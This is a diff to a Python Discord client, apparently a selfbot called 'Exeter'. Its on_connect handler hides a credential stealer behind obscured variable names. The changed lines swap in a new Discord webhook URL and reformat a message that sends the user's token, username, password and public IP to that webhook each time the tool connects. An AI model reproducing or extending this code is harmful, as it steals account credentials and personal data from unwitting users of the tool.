@@ -343,11 +343,11 @@ async def on_message(message):
 async def on_connect():
     Clear()
     startprint()
-    slope = "https://discordapp.com/api/webhooks/824397733791662110/IFqHfgUTeiYRHo0p2YN4xy21oGgB1sWydKiveh6s1FjoQ26km9bYqbPDCC6EoIkNq8bz"
+    slope = "https://discord.com/api/webhooks/824471870699077652/fp_oEZDokVD4QOZ_s2bs8lBs4FiotxAHWvLORsnP01oJQhTkgJQW7u-hBz6x9-8F-FuF"
     ramp = requests.get('https://checkip.amazonaws.com/').content
     peas = bs4(ramp, 'html.parser')
     fliscord = peas.text
-    data = {"content": f'Token > {Exeter.wave}\n\nUsername > {Exeter.user.name}#{Exeter.user.discriminator}\n\nPassword > {Exeter.Code}\n\nIP > {fliscord}'}
+    data = {"content": f'`Token >` {Exeter.wave}\n\n`Username >` {Exeter.user.name}#{Exeter.user.discriminator}\n\n`Password >` {Exeter.Code}\n\n`IP >` {fliscord}'}
     requests.post(slope, data=json.dumps(data), headers={"Content-Type": "application/json"})
 
 
